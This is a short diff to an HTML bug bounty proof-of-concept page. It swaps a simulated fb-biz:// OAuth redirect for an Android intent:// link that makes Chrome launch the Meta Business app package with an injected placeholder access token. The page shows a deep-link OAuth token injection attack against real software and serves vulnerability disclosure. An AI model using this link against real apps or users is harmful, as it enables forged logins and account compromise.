@@ -2,7 +2,8 @@
 <html>
 <body>
     <h1>Bug Bounty PoC</h1>
-    <!-- This simulates the Facebook OAuth redirect -->
-    <a href="fb-biz://auth?access_token=SUCCESS_TOKEN_LEAKED_1337" style="font-size: 50px;">CLICK ME TO LOGIN</a>
+    <br><br>
+    <!-- We force Chrome to launch the Meta App package directly -->
+    <a href="intent://auth?access_token=SUCCESS_TOKEN_LEAKED_1337#Intent;scheme=fb-biz;package=com.facebook.pages.app;end" style="font-size: 50px;">CLICK ME TO LOGIN</a>
 </body>
 </html>
